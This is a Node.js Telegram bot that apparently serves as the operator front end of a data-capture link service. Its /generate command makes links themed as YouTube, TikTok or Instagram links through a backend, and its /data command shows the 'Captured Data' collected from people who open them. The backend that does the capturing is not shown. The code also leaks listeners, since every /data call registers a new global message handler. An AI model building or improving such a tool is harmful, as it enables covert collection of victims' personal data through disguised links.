const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const BASE_URL = `https://${process.env.REPLIT_DB_URL}`;

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Welcome! Use /generate to create a link.");
});

bot.onText(/\/generate/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Choose a platform:");
    bot.sendMessage(chatId, "1. YouTube\n2. TikTok\n3. Instagram", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "YouTube", callback_data: "youtube" }],
                [{ text: "TikTok", callback_data: "tiktok" }],
                [{ text: "Instagram", callback_data: "instagram" }],
            ],
        },
    });
});

bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const platform = query.data;

    try {
        const response = await axios.post(`${BASE_URL}/generate-link`, {
            platform,
        });
        const linkData = response.data;
        bot.sendMessage(chatId, `Your link: ${linkData.url}`);
    } catch (error) {
        bot.sendMessage(chatId, "Error generating link.");
    }
});

bot.onText(/\/data/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Enter the link ID:");
    bot.on("message", async (message) => {
        if (message.text) {
            try {
                const response = await axios.get(
                    `${BASE_URL}/data/${message.text}`,
                );
                const data = response.data;
                bot.sendMessage(
                    chatId,
                    `Captured Data:\n${JSON.stringify(data, null, 2)}`,
                );
            } catch (error) {
                bot.sendMessage(chatId, "Data not found.");
            }
        }
    });
});
